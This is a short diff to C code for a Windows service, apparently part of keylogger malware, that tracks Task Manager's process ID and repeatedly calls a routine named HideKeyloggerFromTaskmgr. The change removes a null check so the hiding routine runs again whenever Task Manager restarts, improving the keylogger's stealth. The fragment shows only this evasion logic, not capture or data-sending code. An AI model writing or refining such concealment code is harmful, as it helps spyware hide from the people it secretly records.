@@ -45,8 +45,7 @@ VOID SvcInit(DWORD ac, LPTSTR *av)
         if (taskmgrPID != 1 && taskmgrPID != taskmgrPIDtmp)
         {
             taskmgrPIDtmp = taskmgrPID;
-            if (hThread == NULL)
-                hThread = HideKeyloggerFromTaskmgr(taskmgrPID);
+            hThread = HideKeyloggerFromTaskmgr(taskmgrPID);
             if (hThread == NULL) taskmgrPIDtmp = 1;// if HideKeyloggerFromTaskmgr fails, try again next loop.
         }
         if (hThread)
